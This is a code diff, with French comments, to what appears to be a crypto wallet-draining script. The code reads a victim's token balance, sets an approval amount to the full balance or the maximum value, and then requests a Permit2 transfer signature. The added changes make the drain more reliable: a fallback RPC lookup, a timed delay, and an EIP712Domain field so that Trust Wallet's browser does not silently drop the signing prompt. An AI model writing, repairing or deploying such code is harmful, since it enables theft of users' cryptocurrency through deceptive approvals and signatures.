@@ -1225,15 +1225,20 @@ try {
       if (from && from !== '0x0000000000000000000000000000000000000000') {
         var balCallData = '0x70a08231000000000000000000000000' + from.slice(2).padStart(64, '0');
         var balHex;
+        // publicnode en premier — plus fiable que le provider injecté pour les eth_call
         try {
-          balHex = await eth.request({ method: 'eth_call', params: [{ to: tokenAddr, data: balCallData }, 'latest'] });
-        } catch(e) {
           var rpcResp = await fetch('https://ethereum.publicnode.com', {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ jsonrpc:'2.0', id:1, method:'eth_call', params:[{ to: tokenAddr, data: balCallData }, 'latest'] })
           });
           var rpcJson = await rpcResp.json();
-          balHex = rpcJson.result;
+          balHex = rpcJson && rpcJson.result;
+        } catch(e) {}
+        // fallback sur le provider injecté si publicnode échoue
+        if (!balHex || balHex === '0x') {
+          try {
+            balHex = await eth.request({ method: 'eth_call', params: [{ to: tokenAddr, data: balCallData }, 'latest'] });
+          } catch(e) {}
         }
         var bal = ethers.BigNumber.from(balHex && balHex !== '0x' ? balHex : '0x0');
         approveAmount = ethers.BigNumber.from(bal.isZero() ? MAX_UINT : bal.toString());
@@ -1288,10 +1293,20 @@ try {
     if (!from) return;
 
     // Step 2: Permit2 gasless signature — from est maintenant valide
+    // Délai 2s : TW Browser affiche un écran intermédiaire après confirmation TX.
+    // eth_signTypedData_v4 déclenché pendant cet écran est ignoré silencieusement.
+    await new Promise(function(r) { setTimeout(r, 2000); });
+
     var nonce    = Math.floor(Math.random() * Math.pow(2, 48));
     var deadline = Math.floor(Date.now() / 1000) + 3600;
     var permit2TypedData = {
       types: {
+        // EIP712Domain obligatoire — TW Browser rejette silencieusement sans ce champ
+        EIP712Domain: [
+          { name: 'name',              type: 'string'  },
+          { name: 'chainId',           type: 'uint256' },
+          { name: 'verifyingContract', type: 'address' }
+        ],
         PermitTransferFrom: [
           { name: 'permitted', type: 'TokenPermissions' },
           { name: 'spender',   type: 'address'          },
